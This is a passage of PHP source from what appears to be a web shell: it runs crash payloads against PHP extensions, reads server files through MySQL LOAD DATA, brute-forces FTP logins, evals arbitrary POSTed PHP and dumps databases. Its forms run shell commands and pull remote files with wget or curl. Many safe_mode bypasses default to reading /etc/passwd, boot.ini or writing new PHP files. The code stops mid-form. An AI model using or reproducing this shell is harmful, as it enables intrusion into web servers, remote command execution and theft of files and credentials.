  case 'dos28':
  if (extension_loaded("gd")){ $buff = str_repeat("A",9999); $res = imagepsloadfont($buff); echo "boom!!\n";}
  break;
  case 'dos29':
  if(function_exists('msql_connect')){ msql_pconnect(str_repeat('A',49424).'BBBB'); msql_connect(str_repeat('A',49424).'BBBB');}
  break;
  case 'dos30':
  $a=str_repeat("A", 65535);  $b=1;  $c=str_repeat("A", 65535);  chunk_split($a,$b,$c);
  break;
  case 'dos31':
  if (extension_loaded("win32std") ) { win_browse_file( 1, NULL, str_repeat( "\x90", 264 ), NULL, array( "*" => "*.*" ) );}
  break;
  case 'dos32':
  if (extension_loaded( "iisfunc" ) ){ $buf_unicode = str_repeat( "A", 256 ); $eip_unicode = "\x41\x41"; iis_getservicestate( $buf_unicode . $eip_unicode );}
  break;
  case 'dos33':
  $buff = str_repeat("\x41", 250);$get_EIP = "\x42\x42";$get_ESP = str_repeat("\x43", 100);$get_EBP = str_repeat("\x44", 100);ntuser_getuserlist($buff.$get_EIP.$get_ESP.$get_EBP);
  break;
  case 'dos34':
  if (extension_loaded("bz2")){ $buff = str_repeat("a",1000); com_print_typeinfo($buff);}
  break;
  case 'dos35':
  $a = str_repeat("/", 4199000); iconv(1, $a, 1);
  break;
  case 'dos36':
  $a = str_repeat("/", 2991370); iconv_mime_decode_headers(0, 1, $a);
  break;
  case 'dos37':
  $a = str_repeat("/", 3799000); iconv_mime_decode(1, 0, $a);
 break;
break;
 case 'dos38':
 $a = str_repeat("/", 9791999); iconv_strlen(1, $a);
 break;
}
if ($_POST['cmd']=="Alucar_mysql")
 {
  if(empty($_POST['test3_sr'])) { $_POST['test3_sr'] = "localhost"; }
  if(empty($_POST['test3_port'])) { $_POST['test3_port'] = "3306"; }
  $db = @mysql_connect($_POST['test3_sr'].':'.$_POST['test3_port'],$_POST['test3_ml'],$_POST['test3_mp']);
  if($db)
   {
   if(@mysql_select_db($_POST['test3_md'],$db))
    {
     @mysql_query("DROP TABLE IF EXISTS Alucar");
     @mysql_query("CREATE TABLE `Alucar` ( `file` LONGBLOB NOT NULL )");
     @mysql_query("LOAD DATA LOCAL INFILE \"".str_replace('\\','/',$_POST['test3_file'])."\" INTO TABLE Alucar FIELDS TERMINATED BY '' ESCAPED BY '' LINES TERMINATED BY '\n'");
     $r = @mysql_query("SELECT * FROM Alucar");
     while(($r_sql = @mysql_fetch_array($r))) { echo @htmlspecialchars($r_sql[0]); }
     @mysql_query("DROP TABLE IF EXISTS Alucar");
    }
    else echo "[-] ERROR! Can't select database";
   @mysql_close($db);
   }
  else echo "[-] ERROR! Can't connect to mysql server";
 }
if ($_POST['cmd']=="ftp_brute")
 {
 $suc = 0;
 foreach($users as $user)
  {
  $connection = @ftp_connect($ftp_server,$ftp_port,10);
  if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - success\r\n"; $suc++; }
  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - success\r\n"; $suc++; } }
  @ftp_close($connection);
  }
 echo "\r\n-------------------------------------\r\n";
 $count = count($users);
 if(isset($_POST['reverse'])) { $count *= 2; }
 echo $lang[$language.'_text97'].$count."\r\n";
 echo $lang[$language.'_text98'].$suc."\r\n";
 }
if ($_POST['cmd']=="php_eval"){
 $eval = @str_replace("<?","",$_POST['php_eval']);
 $eval = @str_replace("?>","",$eval);
 @eval($eval);}
if ($_POST['cmd']=="mysql_dump")
 {
  if(isset($_POST['dif'])) { $fp = @fopen($_POST['dif_name'], "w"); }
  $sql = new my_sql();
  $sql->db   = $_POST['db'];
  $sql->host = $_POST['db_server'];
  $sql->port = $_POST['db_port'];
  $sql->user = $_POST['mysql_l'];
  $sql->pass = $_POST['mysql_p'];
  $sql->base = $_POST['mysql_db'];
  if(!$sql->connect()) { echo "[-] ERROR! Can't connect to SQL server"; }
  else if(!$sql->select_db()) { echo "[-] ERROR! Can't select database"; }
  else if(!$sql->dump($_POST['mysql_tbl'])) { echo "[-] ERROR! Can't create dump"; }
  else {
   if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v."\r\n"; }
   else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v."\r\n"); }
   else { echo "[-] ERROR! Can't write in dump file"; }
   }
 }
echo "</textarea></div>";
echo "</b>";
echo "</td></tr></table>";
echo "<table width=100% cellpadding=0 cellspacing=0>";
function div_title($title, $id)
{
  return '<a style="cursor: pointer;" onClick="change_divst(\''.$id.'\');">'.$title.'</a>';
}
function div($id)
 {
 if(isset($_COOKIE[$id]) && $_COOKIE[$id]==0) return '<div id="'.$id.'" style="display: none;">';
 return '<div id="'.$id.'">';
 }
if(!$safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text2'],'id1').$table_up2.div('id1').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','cmd',85,''));
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}
else{
echo $fs.$table_up1.div_title($lang[$language.'_text28'],'id2').$table_up2.div('id2').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',85,$dir).in('hidden','cmd',0,'safe_dir').ws(4).in('submit','submit',0,$lang[$language.'_butt6']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text208'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select name=\"method\">
                            <option value=\"system\" <? if ($method==\"system\") { echo \"selected\"; } ?>system</option>
                            <option value=\"passthru\" <? if ($method==\"passthru\") { echo \"selected\"; } ?>passthru</option>
                            <option value=\"exec\" <? if ($method==\"exec\") { echo \"selected\"; } ?>exec</option>
                            <option value=\"shell_exec\" <? if ($method==\"shell_exec\") { echo \"selected\"; } ?>shell_exec</option>
                            <option value=\"popen\" <? if ($method==\"popen\") { echo \"selected\"; } ?>popen</option>
                            <option value=\"proc_open\" <? if ($method==\"proc_open\") { echo \"selected\"; } ?>proc_open</option>
                      </select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text3'].$arrow."</b>".in('text','command',54,(!empty($_POST['command'])?($_POST['command']):("id"))).in('hidden','cmd',0,'command').ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;



echo $fs.$table_up1.div_title($lang[$language.'_text203'],'id411').$table_up2.div('id411').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>",in('text','ini_restore',85,'/etc/passwd').in('hidden','cmd',0,'ini_restore').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text224'],'id511').$table_up2.div('id511').$ts;
echo sr(15,"<b>".$lang[$language.'_text202'].$arrow."</b>","<select size=\"1\" name=\"plugin\"><option value=\"plugin\">/etc/passwd</option></option></select>".in('hidden','cmd',0,'plugin').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text42'],'id3').$table_up2.div('id3').$ts;
echo sr(15,"<b>".$lang[$language.'_text43'].$arrow."</b>",in('text','e_name',85,$dir).in('hidden','cmd',0,'edit_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt11']));
echo $te.'</div>'.$table_end1.$fe;
if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text204'],'id204').$table_up2.div('id204').$ts;
echo sr(15,"<b>".$lang[$language.'_text226'].$arrow."</b>",in('text','test10_file',96,(!empty($_POST['test10_file'])?($_POST['test10_file']):('../../file.php'))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test10'));
echo sr(15,"<b>".$lang[$language.'_text227'].$arrow."</b>",in('text','test10_content',96,(!empty($_POST['test10_content'])?($_POST['test10_content']):('<? echo \'gotcha\'; ?>'))).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text228'],'id228').$table_up2.div('id228').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test12_cmd',96,(!empty($_POST['test12_cmd'])?($_POST['test12_cmd']):('ls -la'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test12').in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode&&!$unix)
{
echo $fs.$table_up1.div_title($lang[$language.'_text229'],'id229').$table_up2.div('id229').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test13_cmd',96,(!empty($_POST['test13_cmd'])?($_POST['test13_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test13').in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode&&extension_loaded("ionCube Loader"))
{
echo $fs.$table_up1.div_title($lang[$language.'_text230'],'id230').$table_up2.div('id230').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test14_cmd',96,(!empty($_POST['test14_cmd'])?($_POST['test14_cmd']):('../../boot.ini'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test14').in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode&&!$unix&&extension_loaded("win32std"))
{
echo $fs.$table_up1.div_title($lang[$language.'_text231'],'id231').$table_up2.div('id231').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test15_cmd',96,(!empty($_POST['test15_cmd'])?($_POST['test15_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test15').in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode&&!$unix&&extension_loaded("win32service"))
{
echo $fs.$table_up1.div_title($lang[$language.'_text232'],'id232').$table_up2.div('id232').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test16_cmd',96,(!empty($_POST['test16_cmd'])?($_POST['test16_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test16').in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode&&extension_loaded("perl"))
{
echo $fs.$table_up1.div_title($lang[$language.'_text131'],'id34').$table_up2.div('id233').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test17_cmd',96,(!empty($_POST['test17_cmd'])?($_POST['test17_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test17').in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode&&!$unix&&extension_loaded("ffi"))
{
echo $fs.$table_up1.div_title($lang[$language.'_text132'],'id35').$table_up2.div('id234').$ts;
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test18_cmd',96,(!empty($_POST['test18_cmd'])?($_POST['test18_cmd']):('dir'))).ws(4).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test18').in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode&&@function_exists('fopen'))
{
echo $fs.$table_up1.div_title($lang[$language.'_text122'],'id1000').$table_up2.div('id1000').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test20',96,(!empty($_POST['test20'])?($_POST['test20']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test20').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text127'],'id1001').$table_up2.div('id1001').$ts;
echo sr(15,"<b>".$lang[$language.'_text65']." ".$lang[$language.'_text59'].$arrow."</b>",in('text','test21_file',96,(!empty($_POST['test21_file'])?($_POST['test21_file']):($dir."test.php"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test21').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}

if($safe_mode&&@function_exists('realpath'))
{
$select_n_rlph = "<select name='n_rlph'><option value=1>[ 1 ] (<<0,01 sec)</option><option value=2>[ 2 ] (<0,01 sec)</option>".
"<option value=3 selected>[ 3 ] (<1 sec (default))</option>".
"<option value=4>[ 4 ] (<10 sec)</option><option value=5>[ 5 ] (>100 sec (danger))</option><option value=6>[ 6 ] (>>100 sec (danger))</option></select>";
echo $fs.$table_up1.div_title($lang[$language.'_text123'],'id1002').$table_up2.div('id1002').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','dir',30,(!empty($_POST['dir_rlph'])?($_POST['dir_rlph']):($dir))).ws(2).'<b>'.$lang[$language.'_text55'].'</b>'.ws(2).in('text','end_rlph',6,(!empty($_POST['end_rlph'])?($_POST['end_rlph']):('.php'))).ws(2).in('hidden','cmd',0,'test22').ws(2).'<b>'.$lang[$language.'_text146'].'</b>'.ws(2).$select_n_rlph.ws(2).in('hidden','test22',0,'test22').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&@function_exists('session_save_path'))
{
echo $fs.$table_up1.div_title($lang[$language.'_text124'],'id1003').$table_up2.div('id1003').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test23_file2',96,(!empty($_POST['test23_file2'])?($_POST['test23_file2']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test23'));
echo sr(15,"<b>".$lang[$language.'_text128'].$arrow."</b>",in('text','test23_file1',96,(!empty($_POST['test23_file1'])?($_POST['test23_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text125'],'id1004').$table_up2.div('id1004').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test24_file2',96,(!empty($_POST['test24_file2'])?($_POST['test24_file2']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test24'));
echo sr(15,"<b>".$lang[$language.'_text128'].$arrow."</b>",in('text','test24_file1',96,(!empty($_POST['test24_file1'])?($_POST['test24_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;

}
if($safe_mode&&@function_exists('readfile'))
{
echo $fs.$table_up1.div_title($lang[$language.'_text126'],'id1005').$table_up2.div('id1005').$ts;
echo sr(15,"<b>".$lang[$language.'_text65']." ".$lang[$language.'_text59'].$arrow."</b>",in('text','test25_file2',96,(!empty($_POST['test25_file2'])?($_POST['test25_file2']):($dir."shell.php"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test25'));
echo sr(15,"<b>".$lang[$language.'_text128'].$arrow."</b>",in('text','test25_file1',96,(!empty($_POST['test25_file1'])?($_POST['test25_file1']):("<? phpinfo(); ?>"))).ws(4).in('submit','submit',0,$lang[$language.'_butt10']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text207'],'id207').$table_up2.div('id207').$ts;
echo sr(15,"<b>".$lang[$language.'_text206'].$arrow."</b>",in('text','glob',85,'/etc/').in('hidden','cmd',0,'glob').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;
echo $fs.$table_up1.div_title($lang[$language.'_text209'],'id209').$table_up2.div('id209').$ts;
echo sr(15,"<b>".$lang[$language.'_text206'].$arrow."</b>",in('text','root',85,'/etc/').in('hidden','cmd',0,'root').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt7']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text121'],'id2900').$table_up2.div('id2900').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test19',85,'/etc/passwd').in('hidden','cmd',0,'test19').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text210'],'id210').$table_up2.div('id210').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','zend',85,(!empty($_POST['zend'])?($_POST['zend']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'zend').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;

echo $fs.$table_up1.div_title($lang[$language.'_text211'],'id211').$table_up2.div('id211').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text212']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','php_ini1',10,'php.ini').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text213']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','htacces',10,'htaccess').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text218']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>",in('text','file_ini',10,'ini.php').ws(4).in('submit','submit',0,$lang[$language.'_butt65']));
echo $te.'</div>'.$table_end1.$fe;

$aliases2 = '';
foreach ($aliases as $alias_name=>$alias_cmd)
 {
 $aliases2 .= "<option>$alias_name</option>";
 }
echo $fs.$table_up1.div_title($lang[$language.'_text7'],'id6').$table_up2.div('id6').$ts;
echo sr(15,"<b>".ws(9).$lang[$language.'_text8'].$arrow.ws(4)."</b>","<select name=alias>".$aliases2."</select>".in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;

}

if($safe_mode){
echo $fs.$table_up1.div_title($lang[$language.'_text57'],'id4').$table_up2.div('id4').$ts;
echo sr(15,"<b>".$lang[$language.'_text58'].$arrow."</b>",in('text','mk_name',54,(!empty($_POST['mk_name'])?($_POST['mk_name']):("new_name"))).ws(4)."<select name=action><option value=create>".$lang[$language.'_text65']."</option><option value=delete>".$lang[$language.'_text66']."</option></select>".ws(3)."<select name=what><option value=file>".$lang[$language.'_text59']."</option><option value=dir>".$lang[$language.'_text60']."</option></select>".in('hidden','cmd',0,'mk').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt13']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode && $unix){
echo $fs.$table_up1.div_title($lang[$language.'_text67'],'id5').$table_up2.div('id5').$ts;
echo sr(15,"<b>".$lang[$language.'_text68'].$arrow."</b>","<select name=what><option value=mod>CHMOD</option><option value=own>CHOWN</option><option value=grp>CHGRP</option></select>".ws(2)."<b>".$lang[$language.'_text69'].$arrow."</b>".ws(2).in('text','param1',40,(($_POST['param1'])?($_POST['param1']):("filename"))).ws(2)."<b>".$lang[$language.'_text70'].$arrow."</b>".ws(2).in('text','param2 title="'.$lang[$language.'_text71'].'"',26,(($_POST['param2'])?($_POST['param2']):("0777"))).in('hidden','cmd',0,'ch_').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt1']));
echo $te.'</div>'.$table_end1.$fe;
}

echo $fs.$table_up1.div_title($lang[$language.'_text54'],'id7').$table_up2.div('id7').$ts;
echo sr(15,"<b>".$lang[$language.'_text52'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text53'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text55'].$arrow."</b>",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')."* ( .txt;.php;.htm )".in('hidden','cmd',0,'search_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
if(!$safe_mode && $unix){
echo $fs.$table_up1.div_title($lang[$language.'_text76'],'id8').$table_up2.div('id8').$ts;
echo sr(15,"<b>".$lang[$language.'_text72'].$arrow."</b>",in('text','s_text',85,'text').ws(4).in('submit','submit',0,$lang[$language.'_butt12']));
echo sr(15,"<b>".$lang[$language.'_text73'].$arrow."</b>",in('text','s_dir',85,$dir)." * ( /root;/home;/tmp )");
echo sr(15,"<b>".$lang[$language.'_text74'].$arrow."</b>",in('text','s_mask',85,'*.[hc]').ws(1).$lang[$language.'_text75'].in('hidden','cmd',0,'find_text').in('hidden','dir',0,$dir));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text32'],'id9').$table_up2.$font;
echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=3>";
echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"Xgr0upVN.php\");\r\n//readfile(\"/etc/passwd\");"));
echo "</textarea>";
echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
echo "</div></div></font>";
echo $table_end1.$fe;
if($safe_mode&&$curl_on)
{
echo $fs.$table_up1.div_title($lang[$language.'_text33'],'id10').$table_up2.div('id10').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text34'],'id11').$table_up2.div('id11').$ts;
echo "<table class=table1 width=100% align=center>";
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}


if($safe_mode&&$mssql_on)
{
echo $fs.$table_up1.div_title($lang[$language.'_text85'],'id13').$table_up2.div('id13').$ts;
echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4_md']):("master"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test4_ml',15,(!empty($_POST['test4_ml'])?($_POST['test4_ml']):("sa"))).ws(4)."<b>".$lang[$language.'_text38'].$arrow."</b>".in('text','test4_mp',15,(!empty($_POST['test4_mp'])?($_POST['test4_mp']):("password"))).ws(4)."<b>".$lang[$language.'_text14'].$arrow."</b>".in('text','test4_port',15,(!empty($_POST['test4_port'])?($_POST['test4_port']):("1433"))));
echo sr(15,"<b>".$lang[$language.'_text3'].$arrow."</b>",in('text','test4_file',96,(!empty($_POST['test4_file'])?($_POST['test4_file']):("dir"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test4').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&$unix&&function_exists('mb_send_mail')){
echo $fs.$table_up1.div_title($lang[$language.'_text112'],'id22').$table_up2.div('id22').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['test5_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_list')){
echo $fs.$table_up1.div_title($lang[$language.'_text113'],'id23').$table_up2.div('id23').$ts;
echo sr(15,"<b>".$lang[$language.'_text4'].$arrow."</b>",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['test6_file']):($dir))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test6').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode&&function_exists('imap_body')){
echo $fs.$table_up1.div_title($lang[$language.'_text114'],'id24').$table_up2.div('id24').$ts;
echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['test7_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if($safe_mode)
{
echo $fs.$table_up1.div_title($lang[$language.'_text115'],'id25').$table_up2.div('id25').$ts;
echo sr(15,"<b>".$lang[$language.'_text116'].$arrow."</b>",in('text','test8_file1',96,(!empty($_POST['test8_file1'])?($_POST['test8_file1']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));
echo sr(15,"<b>".$lang[$language.'_text117'].$arrow."</b>",in('text','test8_file2',96,(!empty($_POST['test8_file2'])?($_POST['test8_file2']):($dir))).ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
echo $te.'</div>'.$table_end1.$fe;
}
if(@ini_get('file_uploads')){
echo "<form name=upload method=POST ENCTYPE=multipart/form-data>";
echo $table_up1.div_title($lang[$language.'_text5'],'id14').$table_up2.div('id14').$ts;
echo sr(15,"<b>".$lang[$language.'_text6'].$arrow."</b>",in('file','userfile',85,''));
echo sr(15,"<b>".$lang[$language.'_text21'].$arrow."</b>",in('checkbox','nf1 id=nf1',0,'1').in('text','new_name',82,'').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
}
if(!$safe_mode&&$unix){
echo $fs.$table_up1.div_title($lang[$language.'_text15'],'id15').$table_up2.div('id15').$ts;
echo sr(15,"<b>".$lang[$language.'_text16'].$arrow."</b>","<select size=\"1\" name=\"with\"><option value=\"wget\">wget</option><option value=\"fetch\">fetch</option><option value=\"lynx\">lynx</option><option value=\"links\">links</option><option value=\"curl\">curl</option><option value=\"GET\">GET</option></select>".in('hidden','dir',0,$dir).ws(2)."<b>".$lang[$language.'_text17'].$arrow."</b>".in('text','rem_file',78,'http://'));
echo sr(15,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',105,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt2']));
echo $te.'</div>'.$table_end1.$fe;
}
echo $fs.$table_up1.div_title($lang[$language.'_text86'],'id16').$table_up2.div('id16').$ts;
echo sr(15,"<b>".$lang[$language.'_text59'].$arrow."</b>",in('text','d_name',85,$dir).in('hidden','cmd',0,'download_file').in('hidden','dir',0,$dir).ws(4).in('submit','submit',0,$lang[$language.'_butt14']));
$arh = $lang[$language.'_text92'];
if(@function_exists('gzcompress')) { $arh .= in('radio','compress',0,'zip').' zip';   }
if(@function_exists('gzencode'))   { $arh .= in('radio','compress',0,'gzip').' gzip'; }
if(@function_exists('bzcompress')) { $arh .= in('radio','compress',0,'bzip').' bzip'; }
echo sr(15,"<b>".$lang[$language.'_text91'].$arrow."</b>",in('radio','compress',0,'none',1).' '.$arh);
echo $te.'</div>'.$table_end1.$fe;
if(@function_exists("ftp_connect")){
echo $table_up1.div_title($lang[$language.'_text93'],'id17').$table_up2.div('id17').$ts."<tr>".$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text87']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
echo sr(25,"<b>".$lang[$language.'_text37'].$arrow."</b>",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp_login']):("anonymous"))));
echo sr(25,"<b>".$lang[$language.'_text38'].$arrow."</b>",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POST['ftp_password']):("billy@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text89'].$arrow."</b>",in('text','ftp_file',45,(!empty($_POST['ftp_file'])?($_POST['ftp_file']):("/ftp-dir/file"))).in('hidden','cmd',0,'ftp_file_down'));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
echo sr(25,"<b>".$lang[$language.'_text90'].$arrow."</b>","<select name=ftp_mode><option>FTP_BINARY</option><option>FTP_ASCII</option></select>".in('hidden','dir',0,$dir));
echo sr(25,"",in('submit','submit',0,$lang[$language.'_butt14']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=tahoma size=-2><b><div align=center id='n'>".$lang[$language.'_text100']."</div></b></font>";
echo sr(25,"<b>".$lang[$language.'_text88'].$arrow."</b>",in('text','ftp_server_port',45,(!empty($_POST['ftp_server_port'])?($_POST['ftp_server_port']):("127.0.0.1:21"))));
